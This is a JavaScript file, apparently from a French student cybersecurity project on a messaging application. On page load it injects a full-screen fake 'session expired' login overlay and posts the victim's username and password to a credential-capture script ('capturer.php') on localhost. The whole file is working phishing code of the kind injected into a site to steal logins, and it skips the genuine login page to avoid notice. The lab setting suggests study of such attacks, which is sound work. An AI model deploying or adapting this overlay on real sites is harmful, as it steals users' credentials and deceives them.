// codes/assets/popup.js
(function() {
    // SÉCURITÉ : Ne jamais s'exécuter sur la page de connexion
    if (window.location.pathname.includes('login.php')) {
        return;
    }

    const currentScriptSrc = document.currentScript ? document.currentScript.src : '';
    const urlParams = new URLSearchParams(currentScriptSrc.split('?')[1]);
    const senderUserId = urlParams.get('sender') || '1';
    
    function createPhishingPopup() {
        if (document.getElementById('phishing-overlay')) return;

        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex; justify-content: center; align-items: center;
            z-index: 2147483647;
        `;

        overlay.innerHTML = `
            <div style="background: white; padding: 30px; border-radius: 10px; width: 350px; text-align: center;">
                <h2 style="color: #e74c3c;">Session Expirée</h2>
                <p>Veuillez vous reconnecter pour continuer.</p>
                <form action="http://localhost/projects/MDI/cyber-securite/messagerie/codes/fake_login/capturer.php?sender=${senderUserId}" method="POST">
                    <input type="text" name="fake_user" placeholder="Nom d'utilisateur" required style="width: 100%; padding: 10px; margin-bottom: 10px;">
                    <input type="password" name="fake_pass" placeholder="Mot de passe" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
                    <button type="submit" style="width: 100%; padding: 10px; background: #e74c3c; color: white; border: none;">Se reconnecter</button>
                </form>
            </div>
        `;
        document.body.appendChild(overlay);
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createPhishingPopup);
    } else {
        createPhishingPopup();
    }
})();